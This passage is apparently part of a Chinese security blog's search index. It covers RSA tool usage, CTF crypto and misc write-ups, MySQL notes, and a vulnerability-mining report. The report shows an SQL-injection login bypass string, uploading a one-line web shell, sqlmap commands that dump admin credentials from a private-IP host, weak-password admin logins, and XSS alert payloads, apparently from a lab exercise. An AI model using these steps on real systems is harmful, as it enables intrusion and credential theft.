$?\n```\n\n\n\n参考：\n[CS基础：Linux基础（1）](https://mp.weixin.qq.com/s/C8kv8itPU1wHYGaH3tG9zg)\n[CS基础：Linux基础（2）](https://mp.weixin.qq.com/s/-eANH2n_IDo6ojyP3RdeDA)\n\n\n\n","tags":["Linux"],"categories":["CS基础"]},{"title":"RSA工具集-openssl,rsatool,RsaCtfTool,RSAtool","url":"/posts/49954.html","content":"![img](https://img.jwt1399.top//img/20200824183710.png)\n\n## openssl\n\n>OpenSSL 是一个开源项目，其组成主要包括一下三个组件：\n    openssl：多用途的命令行工具\n    libcrypto：加密算法库\n    libssl：加密模块应用库，实现了ssl及tls\n\n  openssl可以实现：秘钥证书管理、对称加密和非对称加密 。\n\nRSA PEM文件格式\n\n**1**.PEM私钥格式文件\n```\n-----BEGIN RSA PRIVATE KEY-----\n-----END RSA PRIVATE KEY-----\n```\n\n**2**. PEM公钥格式文件\n```\n-----BEGIN PUBLIC KEY-----\n-----END PUBLIC KEY-----\n```\n**3**. PEM RSAPublicKey公钥格式文件\n\n```\n-----BEGIN RSA PUBLIC KEY-----\n-----END RSA PUBLIC KEY-----\n```\n**OpenSSL密钥相关命令**\n**1**. 生成密钥\n```bash\nopenssl genrsa -out key.pem 1024\n    -out 指定生成文件，此文件包含公钥和私钥两部分，所以即可以加密，也可以解密\n    1024 生成密钥的长度\n```\n**2**. 提取PEM格式公钥\n```bash\nopenssl rsa -in key.pem -pubout -out pubkey.pem\n    -in 指定输入的密钥文件\n    -out 指定提取生成公钥的文件(PEM公钥格式)\n```\n**3**. 提取PEM RSAPublicKey格式公钥\n```bash\nopenssl rsa -in key.pem -RSAPublicKey_out -out pubkey.pem\n    -in 指定输入的密钥文件\n    -out 指定提取生成公钥的文件(PEM RSAPublicKey格式)\n```\n**4**. 公钥加密文件\n```bash\nopenssl rsautl -encrypt -in input.file -inkey pubkey.pem -pubin -out output.file\n    -in 指定被加密的文件\n    -inkey 指定加密公钥文件\n    -pubin 表面是用纯公钥文件加密\n    -out 指定加密后的文件\n```\n**5**. 私钥解密文件\n```bash\nopenssl rsautl -decrypt -in input.file -inkey key.pem -out output.file\n    -in 指定需要解密的文件\n    -inkey 指定私钥文件\n    -out 指定解密后的文件\n```\n**ras** 的用法如下：\n```bash\nopenssl rsa [-inform PEM|NET|DER] [-outform PEM|NET|DER] [-in filename] [-passin arg] [-out filename] [-passout arg]\n       [-sgckey] [-des] [-des3] [-idea] [-text] [-noout] [-modulus] [-check] [-pubin] [-pubout] [-engine id]</pre>\n\n常用选项：\n\n-in filename：指明私钥文件\n-out filename：指明将提取出的公钥保存至指定文件中 \n-pubin:根据公钥提取出私钥\n-pubout：根据私钥提取出公钥 \n```\n示例如下：\n![](https://i.loli.net/2019/07/17/5d2ee290dd00071030.png)\n\n## rsatool\n**安装**：\n```bash\ngit clone https://github.com/ius/rsatool.git\ncd rsatool  //进入这个目录\npython setup.py install\n```\n提供模数和私有指数，PEM输出到key.pem：\n```bash\npython rsatool.py -f PEM -o key.pem -n 13826123222358393307 -d 9793706120266356337\n```\n提供两个素数，DER输出到key.der：\n```bash\npython rsatool.py -f DER -o key.der -p 4184799299 -q 3303891593\n```\n项目地址:https://github.com/ius/rsatool\n## RsaCtfTool\n**安装**：\n```bash\n安装之前必须先安装这四个库(PyCrypto,GMPY2,SymPy,requests)\n\ngit clone https://github.com/Ganapati/RsaCtfTool.git \ncd RsaCtfTool  //进入这个目录\n安装python第三方库\npip install -r requirements.txt\n\n```\n**用法一**：已知公钥(自动求私钥) –publickey，密文 —-uncipherfile。\n将文件解压复制到RsaCtfTool里：\n```bash\npython RsaCtfTool.py --publickey 公钥文件 --uncipherfile 加密的文件\n```\n![](https://i.loli.net/2019/07/17/5d2ee417c580785483.png)\n**用法二**：已知公钥求私钥。\n```bash\nRsaCtfTool.py --publickey 公钥文件 --private\n```\n![](https://i.loli.net/2019/07/17/5d2ee3dc1bc6f77134.png)\n**用法三**：密钥格式转换——把PEM格式的公钥转换为n，e\n```bash\npython RsaCtfTool.py --dumpkey --key 公钥文件\numpkey --key 公钥文件\n```\n![](https://i.loli.net/2019/07/17/5d2ee3b44a24342430.png)\n**用法四**：密钥格式转换——把n,e转换为PEM格式\n```bash\npython RsaCtfTool.py --createpub -n 782837482376192871287312987398172312837182 -e 65537\n```\n![](https://i.loli.net/2019/07/17/5d2ee35e11f2039360.png)\n项目地址:https://github.com/Ganapati/RsaCtfTool\n\n## RSAtool\n下载地址：http://www.skycn.net/soft/appid/39911.html\n`RSAtool `是一个非常方便实用的小工具，可以用来计算 RSA 中的几个参数、生成密钥、加解密，一些不太复杂的破解工作也可以用它。\n我们找一道题为例，来看看 RSAtool 的基本用法。\n>还记得 veryeasy RSA 吗？是不是不难？那继续来看看这题吧，这题也不难。 \n已知一段 RSA 加密的信息为：0xdc2eeeb2782c 且已知加密所用的公钥： \n(N=322831561921859 e = 23) \n请解密出明文，提交时请将数字转化为 ascii 码提交 \n比如你解出的明文是 0x6162，那么请提交字符串 ab \n提交格式：PCTF {明文字符串}\n\n这道题可以用 Python 算出来,用 RSAtool 可以更方便，因为不用自己去写脚本。\n![](https://i.loli.net/2019/07/17/5d2ee91e7a76c90913.png)\n图中的 `P`、`Q`、`R`、`D`、`E` 分别就是 RSA 算法中的 `p`、`q`、`N`、`d`、`e`，右上角选择进制，注意不要弄错，e 只有十六进制可用，所以这里要把 `23` 换成 `17`。\n将` N=322831561921859` 填入，左下角有一个 `Factor N` 的按钮，这是分解 `N` 的意思，点一下，会自动开始分解因数，得到 `P=13574881`、Q=23781539，再点一下 `Calc. D`，计算出`d=42108459725927`，这时可以看到 `Test` 按钮不再是灰色，表明可以使用简单的加解密功能，点它，弹出一个框。\n ![](https://i.loli.net/2019/07/17/5d2ee9383312d23972.png)\n第一个框是明文，第二个框是密文，输入明文 `6162`，点击 `Encrypt`，得到密文 `178401292768926`，这时就可以使用解密功能（好像必须先用一次加密才行）。\n密文 `0xdc2eeeb2782c`，换算十进制 `242094131279916`，点 `Decrypt`，直接得到字符串 `3a5Y`。\n\n参考：\n[Ubuntu下RsaCtfTool的安装及使用](https://www.freebuf.com/sectool/185468.html)\n[RSA 常用工具介绍](https://www.40huo.cn/blog/rsa-tools.html)\n","tags":["RSA工具"],"categories":["CTF"]},{"title":"安恒七月月赛","url":"/posts/49404.html","content":"## Misc\n\n### 真正的CTFer\n下载附件得到一张图片`1.png`\n![](https://i.loli.net/2019/07/15/5d2c586f9efb647980.png)\n将图片拖进HxD,修改图片高度，将05改为10\n![](https://i.loli.net/2019/07/15/5d2c5a3e5be1917063.png)\n修改后保存，得到如下图片\n![](https://i.loli.net/2019/07/15/5d2c5aeb0c67410845.png)\n放大图片，得到flag\n![](https://i.loli.net/2019/07/15/5d2c5b34504bc17912.png)\n### 解不开的秘密\n下载附件得到如下两个文件\n![](https://i.loli.net/2019/07/15/5d2c5b7fe0d1758729.png)\n打开`file`,得到一长串16进制数据\n![](https://i.loli.net/2019/07/15/5d2c5bfed220143050.png)\n打开`flag.docx`,发现需要密码\n![](https://i.loli.net/2019/07/15/5d2c5c47724b233052.png)\n由此推测应该是通过第一个文件得到密码，然后打开第二个文件，得到flag\n将`file`中16进制转换为字符串\n![](https://i.loli.net/2019/07/15/5d2c5d303679f61453.png)\n转换后得到一段base64\n![](https://i.loli.net/2019/07/15/5d2c5d8c53d5f36372.png)\n解密base64之后,爆出注册表信息，发现password关键字，通过查询这是VNC密码\n![](https://i.loli.net/2019/07/15/5d2c5df51a02964636.png)\n通过VNC密码解密工具(K8fcukVNC4)得到密码\n![](https://i.loli.net/2019/07/15/5d2c612d1f00431128.png)\n输入密码后，得到下图\n![](https://i.loli.net/2019/07/15/5d2c61959709055071.png)\nCtrl+a全选，将字体颜色改为黑色，拖动图片，发现flag\n![](https://i.loli.net/2019/07/15/5d2c6215b035a48221.png)\n参考:[破解vnc密码](https://blog.51cto.com/darren/587007)\n### 三行代码抵御攻击\n根据`《亲爱的,热爱的》`电视剧情节\n![](https://i.loli.net/2019/07/15/5d2c63f8735c484003.png)\n直接nc连接依次输入图中三行代码，得到flag\n![](https://i.loli.net/2019/07/15/5d2c629f2e91e19287.png)\n","tags":["Write-up"],"categories":["CTF"]},{"title":"攻防世界-Crypto-进阶","url":"/posts/58189.html","content":"## 你猜猜\n\n**题目信息**\n![](https://i.loli.net/2019/07/15/5d2bed18c10d646240.png)\n下载附件得到`haha.txt`,504B0304很明显是Zip的文件头\n![](https://i.loli.net/2019/07/15/5d2bec9c2196286692.png)\nHxD新建文件，将`haha.txt`中的数据copy进去，命名为`1.zip`\n![](https://i.loli.net/2019/07/15/5d2bef001a76220461.png)\n解压1.zip,发现需要解压密码，直接暴力破解得到密码为123456\n![](https://i.loli.net/2019/07/15/5d2bec931c87584568.png)\n解压后得到`flag.txt`\n![](https://i.loli.net/2019/07/15/5d2befba4435446450.png)\n\n## enc\n**题目信息**\n\n![](https://i.loli.net/2019/07/15/5d2bff133687c21902.png)\n下载附件得到`zero_one`\n![](https://i.loli.net/2019/07/15/5d2c002c9b32a11696.png)\n将ZERO替换为0，ONE替换为1，得到一串二进制字符\n![](https://i.loli.net/2019/07/15/5d2c006f316f380902.png)\n将二进制字符先转换为整型再转换为字符串\n```python\nimport libnum\nn='0100110001101001001100000110011101001100011010010011000001110101010011000110100101000001011101010100100101000011001100000111010101001100011010010011000001100111010011000101001100110100011101000100110001101001010000010111010001001001010000110011010001110101010011000101001100110100011001110100110001010011010000010111010101001100011010010011010001110101010010010100001100110100011101000100110001010011001100000111010001001001010000110011010001110101010011000110100100110100011101010100100101000011001100000111010001001100010100110100000101110101010011000101001100110000011101000100110001010011010000010111010101001100011010010011010001100111010011000101001100110000011101000100100101000011001101000111010101001100011010010011010001110101010010010100001100110100011101010100110001010011010000010111010101001100010100110011000001110101010010010100001100110100011101010100110001101001001100000111010001001001010000110011010001110100010011000110100101000001011101000100110001010011001100000110011101001100011010010011010001110101010011000110100100110100011001110100110001101001010000010111010001001100011010010011000001110101010010010100001100110100011101000100110001101001010000010111010101001100011010010011010001110100010011000101001101000001011101000100100101000011001100000111010001001100010100110100000101110100010010010100001100110000011101010100110001101001001100000110011101001100010100010011110100111101'\nn=int(n,2)\nprint (n)\nprint libnum.n2s(n)\n```\n```python\nint(x, base=10) 函数用于将一个字符串或数字转换为整型。\nx -- 字符串或数字。\nbase -- x的进制数，默认十进制。\n\nlibnum.n2s(n):将n(整型)转换为字符串\n```\n转换为字符串后得到一串base64\n![](https://i.loli.net/2019/07/15/5d2c032ce19fd49487.png)\n解密base64得到一串摩斯电码\n![](https://i.loli.net/2019/07/15/5d2c042fe4e8618474.png)\n解密摩斯电码得到flag:`ALEXCTFTH15O1SO5UP3RO5ECR3TOTXT`\n![](https://i.loli.net/2019/07/15/5d2c046b954f789240.png)\n但是怎么提交都不对，整理之后提交成功\n`ALEXCTF{TH15_1S_5UP3R_5ECR3T_TXT}`\n## 告诉你个秘密\n**题目信息**\n![](https://i.loli.net/2019/07/15/5d2c0e6837a1d10853.png)\n下载附件得到`Basic.txt`,两段16进制数据\n![](https://i.loli.net/2019/07/15/5d2c0e53dc7da80545.png)\n16进制转整型再转字符串\n```python\nimport libnum\nn='636A56355279427363446C4A49454A7154534230526D6843'\nm='56445A31614342354E326C4B4946467A5769426961453067'\nn=int(n,16)\nm=int(m,16)\n#转换为整型\nprint (n)\nprint (m)\n#转换为字符串\nprint libnum.n2s(n)\nprint libnum.n2s(m)\n```\n得到两串base64\n![](https://i.loli.net/2019/07/15/5d2c12883153643908.png)\n解密base64，得到7段字符，疑似键盘围绕加密\n![](https://i.loli.net/2019/07/15/5d2c12c8b10b992809.png)\n```\nr5yG->T lp9I->O BjM->N tFhB->G T6uh->Y y7iJ->U QsZ-A bhM->N\n```\n解密得到：`TONGYUAN`(必须是大写)\n## 说我作弊需要证据\n**题目信息**\n![](https://i.loli.net/2019/07/16/5d2d3318e64ff89463.png)\n根据题目描述将十六进制数（n，e）转换为十进制值，然后再分解n：[在线分解](http://www.factordb.com/index.php)\n```py\nAlice: n=0x53a121a11e36d7a84dde3f5d73cf = 38456719616722997*44106885765559411\nBob:   n=0x99122e61dc7bede74711185598c7 = 49662237675630289*62515288803124247\n公钥： e = 0x10001 = 65537\n```\n下载附件得到一个数据包，打开追踪流发现信息，我们注意到从Alice（192.168.0.13）和Bob（192.168.0.37）的每个数据包都包含base64编码的有效负载。\n![](https://i.loli.net/2019/07/16/5d2d5a2ee5c9718135.png)\n随便选择几条base64进行解密，解码得到序列号，数据和签名\n```python\nSEQ = 4; DATA = 0x2c29150f1e311ef09bc9f06735acL; SIG = 0x1665fb2da761c4de89f27ac80cbL;\nSEQ = 13; DATA = 0x3b04b26a0adada2f67326bb0c5d6L; SIG =0x2e5ab24f9dc21df406a87de0b3b4L;\nSEQ = 2; DATA = 0x8a03676745df01e16745145dd212L; SIG = 0x1378c25048c19853b6817eb9363aL;\nSEQ = 20; DATA = 0x674880905956979ce49af33433L; SIG = 0x198901d5373ea225cc5c0db66987L;\nSEQ = 0; DATA = 0x633282273f9cf7e5a44fcbe1787bL; SIG = 0x2b15275412244442d9ee60fc91aeL;\nSEQ = 28; DATA = 0x19688f112a61169c9090a4f9918dL; SIG =0x1448ac6eee2b2e91a0a6241e590eL;\n```\n猜测应该是解密数据部分，便可以得到flag。\n求解私钥：\n```python\nfrom Crypto.PublicKey import RSA\nimport gmpy\nn = long(3104649130901425335933838103517383)\ne = long(65537)\np = 49662237675630289\nq = 62515288803124247\nd = long(gmpy.invert(e, (p-1)*(q-1)))\nrsa = RSA.construct( (n, e, d) )\n```\n使用私钥就可以可以解密数据\n```python\ndecrypted=rsa.decrypt(long('0x2c29150f1e311ef09bc9f06735acL', 16))\nprint str(hex(decrypted)).strip('0x').rstrip('L').decode('hex')\n```\n这会产生换行符（\\ n 0x0a）。\n查看其余的解码数据包，我们注意到每个数据都包含一个加密字符。将解密的字符放在输出字符串中的序列号的位置是有意义的。我们现在需要解决的是具有相同序列号的多个数据包的问题。为了从好的数据包中分离出坏消息，我们需要使用Alice的私钥来检查签名是否与数据包匹配。\n**解密脚本**：\n**准备**：\n1.我首先需要`pcapng`另存为pcap文件\n![](https://i.loli.net/2019/07/16/5d2d610910b3833623.png)\n2.需要python库：gmpy2，pycrypto，pypcapfile\n3.将脚本和`bob_alice_encrypted.pcap`放在一起，然后运行脚本\n![](https://i.loli.net/2019/07/16/5d2d620feba9969829.png)\n```python\nfrom Crypto.PublicKey import RSA\nimport gmpy2\n\n# Alice's public encryption parameters\nn1 = long(1696206139052948924304948333474767)\ne = long(65537)\n\n# Bob's\nn2 = long(3104649130901425335933838103517383)\n\n# Yes! We can factorize the n\np1 = 38456719616722997\nq1 = 44106885765559411\np2 = 49662237675630289\nq2 = 62515288803124247\n\n# that means we can find the decryption exponent d\nphi1 = (p1-1)*(q1-1)\nphi2 = (p2-1)*(q2-1)\nd1 = long(gmpy2.invert(e, phi1))\nd2 = long(gmpy2.invert(e, phi2))\n\n# now construct the RSA with all the parameters\nrsa1 = RSA.construct( (n1, e, d1) )\nrsa2 = RSA.construct( (n2, e, d2) )\n\n# and decrypt the messages from a pcap file!\nfrom pcapfile import savefile\ncf = savefile.load_savefile(open(\"bob_alice_encrypted.pcap\"))\noutput = {}\nfor p in cf.packets:\n    pack = str(p.packet)[136:].decode('hex').decode('base64')\n    if 'DATA' in pack:\n        seq = int(pack.split(';')[0].split(' ')[2])\n        data = pack[16:].split(';')[0][:-1]\n        sig = long(pack.split(';')[2].split(' = ')[1], 16)\n        m = long(data, 16)\n        decrypted = rsa2.decrypt(m)\n        sigcheck = rsa1.sign(decrypted, '')[0]\n        val = str(hex(decrypted)).strip('0x').rstrip('L').zfill(2).decode('hex')\n        if sig == sigcheck:\n            output[seq] = val\nprint ''.join(output.values())\n```\n参考：[Hack.lu 2015: Creative Cheating](https://honoki.net/2015/10/23/hack-lu-2015-creative-cheating/#more-482)\n## OldDriver（广播攻击）\n**题目信息**\n![](https://i.loli.net/2019/07/16/5d2d91fa606e691545.png)\n**广播攻击**\n**攻击条件**:\n如果一个用户使用同一个加密指数 e 加密了同一个密文，并发送给了其他 e 个用户。那么就会产生广播攻击。\n**攻击原理**\n这里我们假设 e 为 3，并且加密者使用了三个不同的模数 n1,n2,n3\n给三个不同的用户发送了加密后的消息 m，如下\n```python\nc1=m^3 mod n1\nc2=m^3 mod n2\nc3=m^3 mod n3\n```\n这里我们假设 n1,n2,n3\n互素，不然，我们就可以直接进行分解，然后得到 d，进而然后直接解密。\n同时，我们假设` m<ni,1≤i≤3`如果这个条件不满足的话，就会使得情况变得比较复杂，这里我们暂不讨论。\n既然他们互素，那么我们可以根据中国剩余定理，可得\n```python\nm3 ≡ C mod n1n2n3\n```\n此外，既然 `m<ni,1≤i≤3`，那么我们知道 `m3<n1n2n3` 并且 `C<m3<n1n2n3`，那么 `m3=C`，我们对 C 开三次根即可得到 m 的值。\n对于较大的 e 来说，我们只是需要更多的明密文对。\n\n下载附件得到如下数据\n![](https://i.loli.net/2019/07/16/5d2d990fd5e3745049.png)\n给了10组RSA的加密信息，共有10个公钥，并且所有的n都是互质的，因此想到了低加密指数广播攻击[CTF中常见的RSA相关问题总结](https://findneo.github.io/180727rsa-attack/)\n**解密脚本**：\n```python\n#-*-coding: utf-8 -*-\nfrom functools import reduce \nimport gmpy \nimport json, binascii\n# 用 gmpy 算模反元素，回传转成 int 的结果\ndef modinv(a, m):\n    return int(gmpy.invert(gmpy.mpz(a), gmpy.mpz(m)))\n\ndef chinese_remainder(n, a): #中国剩余定理\n    sum = 0 \n    prod = reduce(lambda a, b: a * b, n) \n    for n_i, a_i in zip(n, a):\n    p = prod // n_i\n    sum += a_i * modinv(p, n_i) * p \n    return int(sum % prod)\n\nnset = [] \ncset = []\nwith open(\"data.txt\") as f:  #题目给的n,e,c\n    now = f.read().strip('\\n')\n    now = eval(now)\n    #print now\n    for item in now:\n        nset.append(item['n'])\n        cset.append(item['c'])\n\nm = chinese_remainder(nset, cset)# 用中国剩余定理解同余方程组，推出原先的 t^e\nm = int(gmpy.mpz(m).root(10)[0])# 算 t^e 的 10 次方根（因为 e=10），推回原本的 t\nprint binascii.unhexlify(hex(m)[2:-1])# 把结果从数字先转成 hex 再转成字串\n```\n![](https://i.loli.net/2019/07/16/5d2d9ee13edc313695.png)\n## sleeping-guard\n**题目信息**\n![](https://i.loli.net/2019/07/17/5d2f08de0a80758228.png)\n题目给了服务器及端口号和一份python代码（攻防世界给掉了）\n\n```python\nimport base64\nfrom twisted.internet import reactor, protocol\nimport os\n \nPORT = 9013\n \nimport struct\ndef get_bytes_from_file(filename):  \n    return open(filename, \"rb\").read()  \n    \nKEY = \"[CENSORED]\"\n \ndef length_encryption_key():\n    return len(KEY)\n \ndef get_magic_png():\n    image = get_bytes_from_file(\"./sleeping.png\")\n    encoded_string = base64.b64encode(image)\n    key_len = length_encryption_key()\n    print 'Sending magic....'\n    if key_len != 12:\n        return ''\n    return encoded_string \n    \n \nclass MyServer(protocol.Protocol):\n    def connectionMade(self):\n        resp = get_magic_png()\n        self.transport.write(resp)\n \nclass MyServerFactory(protocol.Factory):\n    protocol = MyServer\n \nfactory = MyServerFactory()\nreactor.listenTCP(PORT, factory)\nreactor.run()\n```\n我们从服务器收到了base64编码的文本。\n![](https://i.loli.net/2019/07/17/5d2f092c6291077235.png)\n它可能是python代码中提到的png图像所以我们解码并将其保存到为out.png：\n```python\nnc 111.198.29.45 47726 | base64 --decode > out.png\n```\n试图打开图像，图像查看器无法打开文件。使用文本查看器打开文件，看到没有PNG标头。所以现在我们有图像，但它以某种方式编码，我们需要找出如何解码它。\n![](https://i.loli.net/2019/07/17/5d2f0ef57606323996.png)\n让我们看一下脚本，答案可能就在那里。在使用base64对文件进行编码后，脚本将检查加密密钥的大小是否为12。\n```python\n关键代码：\nKEY = \"[CENSORED]\"\n \ndef length_encryption_key():\n    return len(KEY)\n    \n    if key_len != 12:\n```\n除了编码本身之外，我们在脚本中看不到任何加密，但我们可以假设在原始脚本中使用12字节长密钥完成加密。但加密什么？有十亿种选择，我们如何找到合适的解密算法？嗯，答案很简单 - 这是一个CTF，管理员知道我们不能尝试所有可能的解密方法，所以它可能是平庸的选择：异或。\n\n在选择我们的加密方法后，让我们考虑如何找到密钥本身。我们知道该文件是PNG图像，因此我们可以将加密文件的前12个字节与正常PNG文件的前12个字节进行异或。\n```python\n89 50 4E 47 0D 0A 1A 0A 00 00 00 0D XOR DE 3F 0F 2F 52 4B 45 41 65 79 21 32  == 57 6F 41 68 5F 41 5F 4B 65 79 21 3F  \n```\n在ASCII中是：“ WoAh_A_Key！？”\n现在我们有了密钥，我们可以运行python脚本，要在Linux环境下运行，得到的图片才能打开，windows环境下不行\n```python\ndef xor(data, key):\n    l = len(key)\n    return bytearray((\n        (data[i] ^ key[i % l]) for i in range(0,len(data))\n    ))\n \n# Read the encrypted image as bytearray\ndata = bytearray(open('out.png', 'rb').read())\n \n# This is our key as bytearray: \"WoAh_A_Key!?\"\nkey = bytearray([0x57, 0x6f, 0x41, 0x68, 0x5f, 0x41, 0x5f, 0x4b, 0x65, 0x79, 0x21, 0x3f])\n \nwith open('decrypted.png', 'w') as file_:\n    file_.write(xor(data,key))\n```\n得到flag\n![](https://i.loli.net/2019/07/17/5d2f1b8f3010a75409.png)\n## wtc_rsa_bbq\n**题目信息**\n![](https://i.loli.net/2019/07/18/5d302890e5bd654792.png)\n下载附件得到`cry200`,用HxD打开\n![](https://i.loli.net/2019/07/18/5d3029df99a4151271.png)\n根据文件头：`504B0304`确定该文件为zip，添加后缀`.zip`,得到公钥`key.pem`和密文`cipher.bin`\n![](https://i.loli.net/2019/07/18/5d302a815e9f395102.png)\n将两个文件放在RsaCtfTool下\n直接运行`python RsaCtfTool.py --publickey key.pem --uncipherfile  cipher.bin`\n得到flag\n![](https://i.loli.net/2019/07/18/5d3028ca0c52d10590.png)\n## Handicraft_RSA\n**题目信息**\n![](https://i.loli.net/2019/07/18/5d3044864eb1737292.png)\n下载附件得到`Handicraft_RSA`文件，用notepad打开，得到如下信息(加密算法，公钥，密文)\n![](https://i.loli.net/2019/07/18/5d3044d13963818901.png)\n![](https://i.loli.net/2019/07/18/5d3045037abd227919.png)\n将`PUBLIC KEY`保存为`1.pem`,使用RsaCtfTool转化为`n，e`形式\n![](https://i.loli.net/2019/07/18/5d30463d91c2732963.png)\n[在线分解](http://www.factordb.com/)分解n得到p,q\n**解密脚本**：\n```python\nimport base64\nimport gmpy2\nfrom Crypto.Util.number import *\nfrom Crypto.PublicKey import RSA\n\nn=21702007965967851183912845012669844623756908507890324243024055496763943595946688940552416734878197459043831494232875785620294668737665396025897150541283087580428261036967329585399916163401369611036124501098728512558174430431806459204349427025717455575024289926516646738721697827263582054632714414433009171634156535642801472435174298248730890036345522414464312932752899972440365978028349224554681969090140541620264972373596402565696085035645624229615500129915303416150964709569033763686335344334340374467597281565279826664494938820964323794098815428802817709142950181265208976166531957235913949338642042322944000000001\np=139457081371053313087662621808811891689477698775602541222732432884929677435971504758581219546068100871560676389156360422970589688848020499752936702307974617390996217688749392344211044595211963580524376876607487048719085184308509979502505202804812382023512342185380439620200563119485952705668730322944000000001\nq=155617827023249833340719354421664777126919280716316528121008762838820577123085292134385394346751341309377546683859340593439660968379640585296350265350950535158375685103003837903550191128377455111656903429282868722284520586387794090131818535032744071918282383650099890243578253423157468632973312000000000000001\ne=65537\nd = gmpy2.invert(e,(p-1)*(q-1))\n\nkey = RSA.construct((long(n), long(e), long(d), long(p), long(q)))\nmsg = base64.b64decode(\"eER0JNIcZYx/t+7lnRvv8s8zyMw8dYspZlne0MQUatQNcnDL/wnHtkAoNdCalQkpcbnZeAz4qeMX5GBmsO+BXyAKDueMA4uy3fw2k/dqFSsZFiB7I9M0oEkqUja52IMpkGDJ2eXGj9WHe4mqkniIayS42o4p9b0Qlz754qqRgkuaKzPWkZPKynULAtFXF39zm6dPI/jUA2BEo5WBoPzsCzwRmdr6QmJXTsau5BAQC5qdIkmCNq7+NLY1fjOmSEF/W+mdQvcwYPbe2zezroCiLiPNZnoABfmPbWAcASVU6M0YxvnXsh2YjkyLFf4cJSgroM3Aw4fVz3PPSsAQyCFKBA==\")   \n    for _ in xrange(20):\n        enc = key.decrypt(msg)\n        msg = enc\nprint (msg)\n```\n![](https://i.loli.net/2019/07/18/5d30457c9c33a46621.png)","tags":["Write-up","Crypto"],"categories":["CTF"]},{"title":"记一次漏洞挖掘","url":"/posts/54441.html","content":"\n## 题目一：PHP网页\n\n## 0x01 SQl注入\nOWASP扫描,爆出sql注入漏洞\n![](https://i.loli.net/2019/07/12/5d2819e4517be17785.png)\n利用爆出的万能钥匙`（ZAP' OR '1'='1' -- ）`进行登录\n![](https://i.loli.net/2019/07/12/5d2819e4516a893245.png)\n登录成功\n![](https://i.loli.net/2019/07/12/5d281a8c0e79587010.png)\n## 0x02 文件上传\n第一步登录成功后，发现疑似上传点\n![](https://i.loli.net/2019/07/12/5d281a8c09d0471290.png)\n直接上传一句话木马\n![](https://i.loli.net/2019/07/12/5d281a8c0e6a986304.png)\n上传成功\n![](https://i.loli.net/2019/07/12/5d281a8c0e4f041942.png)\n菜刀连接\n![](https://i.loli.net/2019/07/12/5d281c01ebb7b22332.png)\ngetshell,就可以干坏事拉\n![](https://i.loli.net/2019/07/12/5d281c021cea933698.png)\n## 0x03 SQL注入\n在登录界面查询处发现疑似sql注入处\n![](https://i.loli.net/2019/07/12/5d282a31a396411657.png)\n抓包发现变量名\n![](https://i.loli.net/2019/07/12/5d282a31c349814371.png)\n\n![](https://i.loli.net/2019/07/12/5d281c01ed58d32527.png)sqlmap一键注入\n\n1.查询数据库\n`python sqlmap.py -u http://172.16.12.253/grade/query.php?user=1 --dbs`\n![](https://i.loli.net/2019/07/12/5d281c3014d6768887.png)\n2.查询grade数据库中表名\n`python sqlmap.py -u http://172.16.12.253/grade/query.php?user=1 --tables -D grade`\n![](https://i.loli.net/2019/07/12/5d281dc62de6797635.png)\n3.查询grade库中admins表中的字段\n`python sqlmap.py -u http://172.16.12.253/grade/query.php?user=1 --columns -T admins -D grade`\n![](https://i.loli.net/2019/07/12/5d281d4c80c6431326.png)\n4.查询grade库中admins表中的字段id,name,pass\n`python sqlmap.py -u http://172.16.12.253/grade/query.php?user=1 --dump -C \"id,name,pass\" -T admins -D grade`\n![](https://i.loli.net/2019/07/12/5d281dc62dd0438524.png)\n\n5.爆破phpmyadmin后台密码\n`python sqlmap.py -u http://172.16.12.253/grade/query.php?user=1 --users --password`\n![](https://i.loli.net/2019/07/12/5d281c01f1b3142205.png)\n直接登录后台 账号：root 密码：123456\n![](https://i.loli.net/2019/07/12/5d281f39a689a97473.png)\n登录成功\n![](https://i.loli.net/2019/07/12/5d281ed36fc4150810.png)\n## 0X04 XSS\n反射型Xss <全称跨站脚本攻击，是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。>\n\nOWASP ZAP扫描发现XSS\n![](https://i.loli.net/2019/07/12/5d282c01a0b6277693.png)\n输入`<script>alert(/Two groups the strongest/)</script>`\n![](https://i.loli.net/2019/07/12/5d282cce1443e90518.png)\n成功弹框\n![](https://i.loli.net/2019/07/12/5d2830149582680941.png)\n## 题目二：JS网页\n## 0x01 后台\n百度搜索`JSPGOU`框架得到后台地址\n![](/记一次渗透测试/20190712051248844.png)\n访问后台地址\n![](https://i.loli.net/2019/07/12/5d2842f2118f636894.png)\n尝试弱口令登录 账号：admin 密码：123456\n![](https://i.loli.net/2019/07/12/5d28432e5c5b811715.png)\n登录成功\n![](https://i.loli.net/2019/07/12/5d2849295066170439.png)\n## 0x02 XSS\n输入`<script>alert(/Two groups the strongest/)</script>`\n![](https://i.loli.net/2019/07/12/5d284a782c7cb67767.png)\n成功弹窗\n![](https://i.loli.net/2019/07/12/5d285022e47b090490.png)\n\n## 0x03 文件上传\n在后台发现上传点，可直接上传文件\n![](https://i.loli.net/2019/07/12/5d2847fece78622568.png)\n\n参考：\nhttp://www.dengtar.com/5148.html\nhttps://www.codercto.com/a/63186.html\n\n","tags":["漏洞挖掘"],"categories":["Web"]},{"title":"MySQL-学习笔记","url":"/posts/27695.html","content":"\n###   MySQL安装\n\nWin mysql安装：[Windows下安装MySQL详细教程 - m1racle - 博客园 (cnblogs.com)](https://www.cnblogs.com/zhangkanghui/p/9613844.html)\n\nMac mysql安装：[在MAC上安装mysql_码农伍的博客-CSDN博客_mac安装mysql](https://blog.csdn.net/qq_41134710/article/details/116406099)\n\n### 库操作\n\n#### 数据库连接\n\n```bash\nmysql -h 主机名 -P 端口 -u 用户名 -p 密码\n\nmysql -h 127.0.0.1 -P 3306 -u root -p root\n```\n\n#### 创建数据库\n\n```sql\nCREATE DATABASE [IF NOT EXISTS] 数据库名 CHARACTER SET 数据库采用的字符集 COLLATE 字符集的校对规则\n```\n\n- CHARACTER SET:指定数据库采用的字符集，如果不指定字符集，默认utf8\n\n- COLLATE:指定数据库字符集的校对规则\n  - utf8_bin 区分大小写\n  - utf8_general_ci 不区分大小写\n  - 默认是utf8_general_ci\n\n```sql\nCREATE DATABASE [IF NOT EXISTS] jwt CHARACTER SET utf8 COLLATE utf8_bin\n```\n\n#### 删除数据库\n\n```sql\nDROP DATABASE [IF EXISTS ] 数据库名\n```\n\n#### 查看所有数据库\n\n```sql\nSHOW DATABASES\n```\n\n#### 查看数据库的定义信息\n\n```sql\nSHOW CREATE DATABASE `数据库名`\n\n注：创建数据库、表的时候，为了规避关键字，可以使用反引号解决\n```\n\n#### 备份数据库\n\n```bash\n#备份数据库\nmysqldump -u 用户名 -p -B 数据库1 数据库2 